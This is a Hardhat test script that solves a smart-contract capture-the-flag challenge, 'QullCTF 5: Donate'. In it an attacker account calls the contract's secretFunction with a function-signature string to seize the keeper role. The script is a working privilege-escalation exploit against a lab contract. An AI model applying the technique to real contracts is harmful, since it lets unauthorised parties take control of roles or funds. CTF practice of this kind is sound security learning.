const { expect } = require("chai");
const { ethers } = require("hardhat");
const {
  loadFixture,
} = require("@nomicfoundation/hardhat-toolbox/network-helpers");

describe("QullCTF 5: Donate", () => {
    let contract;
    let contractAddress;
    let owner;
    let attacker;

    async function runEveryTime(){
        [owner, attacker] = await ethers.getSigners();

        const Contract = await ethers.getContractFactory("Donate", owner);
        contract = await Contract.deploy(owner.address);
        await contract.waitForDeployment();

        contractAddress = await contract.getAddress();
        // console.log(owner.address, attacker.address, contractAddress);
        return {owner, attacker, contract};
    }

    it("should hack the contract to become the keeper", async()=>{
        const {owner, attacker, contract} = await loadFixture(runEveryTime);
        // console.log(owner.address, attacker.address, contractAddress);

        await contract.connect(attacker).secretFunction("refundETHAll(address)");

        // console.log("Attacker is the keeper: ", await contract.connect(attacker).keeperCheck());
    })

    after(async()=>{
        // console.log("Attacker is the keeper: ", await contract.connect(attacker).keeperCheck());
        expect(await contract.connect(attacker).keeperCheck()).to.be.equal(true);
    })
});
